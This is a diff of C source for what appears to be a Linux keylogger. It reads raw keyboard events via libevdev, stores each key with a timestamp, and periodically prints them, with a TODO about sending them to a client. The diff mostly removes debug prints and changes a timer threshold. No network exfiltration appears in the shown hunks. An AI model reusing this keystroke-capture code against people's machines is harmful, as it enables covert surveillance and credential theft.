@@ -26,6 +26,7 @@
 #include <time.h>
 #include <unistd.h>
 
+
 // Returns hostname for the local computer
 void checkHostName(int hostname) {
   if (hostname == -1) {
@@ -77,11 +78,13 @@ void log_device(key_package* key_package) {
 }
 
 void reset_structs(key_package* key_package) {
-  key_package->keys = NULL;
+  // key_info blank = {.key = "", .timestamp = ""};
+  // key_package->keys = &blank;
   key_package->keys_arr_size = 0;
 }
 
 void log_keys(key_package* key_package) {
+  int timer_counter = 20000000;
   // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html
 
   // open a device, as libevdev expects a file descriptor. You should have root
@@ -134,25 +137,16 @@ void log_keys(key_package* key_package) {
               .key = libevdev_event_code_get_name(ev.type, ev.code),
               .timestamp = asctime(timeinfo)};
 
-          printf("1 %d\n", key_package->keys_arr_size);
-          printf("2 %c\n", pressed_key.key);
-          
-          printf("3 %c\n", key_package->keys[0].key);
-          printf("4 %c\n", key_package->keys[key_package->keys_arr_size].key);
-
           // append to key_package->keys
           key_package->keys[key_package->keys_arr_size] = pressed_key;
-          printf("a fine delightful evening\n");
           key_package->keys_arr_size++;
-          printf("shitters\n");
         }
       }
     } else {
       printf("unsure of what is going on here..\n");
     }
 
-    if (counter == 10000000) {
-      printf("resetting counter\n");
+    if (counter == timer_counter) {
       counter = 0;
       // TODO: pass this info to the client to store
       print_logged_keys(*key_package);
